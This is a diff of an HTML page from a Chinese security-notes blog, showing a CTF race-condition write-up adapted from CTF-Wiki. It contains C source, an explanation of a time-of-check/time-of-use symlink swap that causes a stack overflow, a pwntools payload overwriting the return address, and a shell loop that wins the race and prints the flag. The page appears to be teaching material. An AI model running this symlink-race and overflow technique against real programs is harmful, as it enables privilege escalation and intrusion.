@@ -1,7 +1,7 @@
 
 
 <!doctype html>
-<html lang="en" class="no-js">
+<html lang="en" class="no-js" data-local-preview="false">
   <head>
     
       <meta charset="utf-8">
@@ -213,7 +213,7 @@
 
   
 
-<div data-shared-navigation="../../../../../navigation/shared/group-2-d7abe878c55d.html" data-site-root="../../../../../" aria-busy="true">
+<div data-shared-navigation="../../../../../navigation/shared/group-2-311df939f8c9.html" data-site-root="../../../../../" aria-busy="true">
   <a href="../../../../..">加载栏目目录…</a>
 </div>
 <script src="../../../../../javascripts/shared-navigation.js"></script>
@@ -250,7 +250,7 @@
       
     
     <div class="md-container" data-md-component="container"
-         data-shared-navigation-target="../../../../../navigation/shared/group-2-d7abe878c55d.html"
+         data-shared-navigation-target="../../../../../navigation/shared/group-2-311df939f8c9.html"
          data-site-root="../../../../../"
          data-navigation-hidden="false">
       
@@ -660,11 +660,24 @@
   
 
 
+<!-- blog-edit-start:4d0c34760afd8781:b0 -->
+
 <h1 id="race-condition">Race Condition, 条件竞争</h1>
+<!-- blog-edit-end:4d0c34760afd8781:b0 -->
+
 <div class="file-actions" data-image-edit-revision="4d0c34760afd8781989bcd888165bb3483fdc2578a1c805d81cd7821a5365140" data-title-link="true"><a href="blog-edit://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cwiki%5C05.other%5Crace_condition.md" class="file-action-link" title="使用本地应用打开源文件">本地编辑</a> | <a href="blog-folder://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cwiki%5C05.other" class="file-action-link" title="使用文件资源管理器打开源文件所在目录">打开本地目录</a> | <span class="file-action-link" style="cursor: pointer;" data-copy="D:\Blog\done\系统性知识\信息安全\wiki\05.other\race_condition.md">复制路径</span></div>
 
+<!-- blog-edit-start:4d0c34760afd8781:b1 -->
+
 <p>并发可能存在的问题, 直接看题目, 基本来自 <a href="https://ctf-wiki.org/pwn/linux/user-mode/race-condition/introduction/">CTF-Wiki</a>.</p>
+<!-- blog-edit-end:4d0c34760afd8781:b1 -->
+
+<!-- blog-edit-start:4d0c34760afd8781:b2 -->
+
 <h2 id="_1">源代码</h2>
+<!-- blog-edit-end:4d0c34760afd8781:b2 -->
+<!-- blog-edit-start:4d0c34760afd8781:b3 -->
+
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-0-1"><span class="linenos" data-linenos=" 1 "></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;fcntl.h&gt;</span>
 </span><span id="__span-0-2"><span class="linenos" data-linenos=" 2 "></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
 </span><span id="__span-0-3"><span class="linenos" data-linenos=" 3 "></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
@@ -710,14 +723,33 @@
 </span><span id="__span-0-43"><span class="linenos" data-linenos="43 "></span><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
 </span><span id="__span-0-44"><span class="linenos" data-linenos="44 "></span><span class="p">}</span>
 </span></code></pre></div>
+<!-- blog-edit-end:4d0c34760afd8781:b3 -->
+
+<!-- blog-edit-start:4d0c34760afd8781:b4 -->
+
 <h2 id="_2">思路</h2>
+<!-- blog-edit-end:4d0c34760afd8781:b4 -->
+<!-- blog-edit-start:4d0c34760afd8781:b5 -->
+
 <p>可以看出程序的基本流程如下</p>
 <ul>
 <li>程序指定读入的文件, 文件名不能为 <code>flag</code>, 大小不大于 256.</li>
 <li>如果成功, 那么将文件内容读入到 <code>buf</code> 中, 大小为 256。</li>
 </ul>
+<!-- blog-edit-end:4d0c34760afd8781:b5 -->
+
+<!-- blog-edit-start:4d0c34760afd8781:b6 -->
+
 <p>看似我们检查了文件的大小，同时 <code>buf</code> 的大小也可以满足对应的最大大小，但是这里存在一个条件竞争的问题。</p>
+<!-- blog-edit-end:4d0c34760afd8781:b6 -->
+
+<!-- blog-edit-start:4d0c34760afd8781:b7 -->
+
 <p><strong>如果我们在程序检查完对应的文件大小后，将对应的文件删除，并符号链接到另外一个更大的文件，那么程序所读入的内容就会更多，从而就会产生栈溢出。</strong></p>
+<!-- blog-edit-end:4d0c34760afd8781:b7 -->
+
+<!-- blog-edit-start:4d0c34760afd8781:b8 -->
+
 <p>首先初始化 <code>big</code> 文件, 如果程序成功把 <code>big</code> 文件读入, 就会输出 <code>flag</code>.<br />
 <div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><span class="linenos" data-linenos="1 "></span><span class="c1"># cat payload.py</span>
 </span><span id="__span-1-2"><span class="linenos" data-linenos="2 "></span><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
@@ -725,6 +757,10 @@
 </span><span id="__span-1-4"><span class="linenos" data-linenos="4 "></span><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x100</span> <span class="o">+</span> <span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">test</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;showflag&#39;</span><span class="p">])</span>
 </span><span id="__span-1-5"><span class="linenos" data-linenos="5 "></span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:4d0c34760afd8781:b8 -->
+
+<!-- blog-edit-start:4d0c34760afd8781:b9 -->
+
 <p>下面是执行的脚本, <code>small</code> 文件不用管里面内容, <code>big</code> 文件就是上面的那个.<br />
 <div class="language-sh highlight"><pre><span></span><code><span id="__span-2-1"><span class="linenos" data-linenos=" 1 "></span><span class="c1"># exp.sh </span>
 </span><span id="__span-2-2"><span class="linenos" data-linenos=" 2 "></span><span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="sb">`</span>seq<span class="w"> </span><span class="m">500</span><span class="sb">`</span>
@@ -742,6 +778,10 @@
 </span><span id="__span-2-14"><span class="linenos" data-linenos="14 "></span><span class="w">    </span>./test<span class="w"> </span>fake
 </span><span id="__span-2-15"><span class="linenos" data-linenos="15 "></span><span class="k">done</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:4d0c34760afd8781:b9 -->
+
+<!-- blog-edit-start:4d0c34760afd8781:b10 -->
+
 <p>最终效果<br />
 <div class="language-sh highlight"><pre><span></span><code><span id="__span-3-1"><span class="linenos" data-linenos=" 1 "></span>➜<span class="w">  </span><span class="o">(</span>sh<span class="w"> </span>exp.sh<span class="w"> </span><span class="p">&amp;</span><span class="o">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sh<span class="w"> </span>run.sh
 </span><span id="__span-3-2"><span class="linenos" data-linenos=" 2 "></span><span class="o">[</span>...<span class="o">]</span>
@@ -756,6 +796,9 @@
 </span><span id="__span-3-11"><span class="linenos" data-linenos="11 "></span>flag<span class="o">{</span>race_condition_succeed!<span class="o">}</span>
 </span><span id="__span-3-12"><span class="linenos" data-linenos="12 "></span><span class="o">[</span>...<span class="o">]</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:4d0c34760afd8781:b10 -->
+
+<div hidden data-text-edit-source="D:\Blog\done\系统性知识\信息安全\wiki\05.other\race_condition.md" data-text-edit-revision="4d0c34760afd8781989bcd888165bb3483fdc2578a1c805d81cd7821a5365140" data-text-edit-marker="4d0c34760afd8781" data-text-edit-schema="1"></div>
 
 
 
@@ -987,8 +1030,6 @@
         <script src="../../../../../javascripts/resizable-sidebar.js"></script>
       
         <script src="../../../../../javascripts/sidebar-toggle-buttons.js"></script>
-      
-        <script src="../../../../../javascripts/review-tracker.js"></script>
       
         <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
       
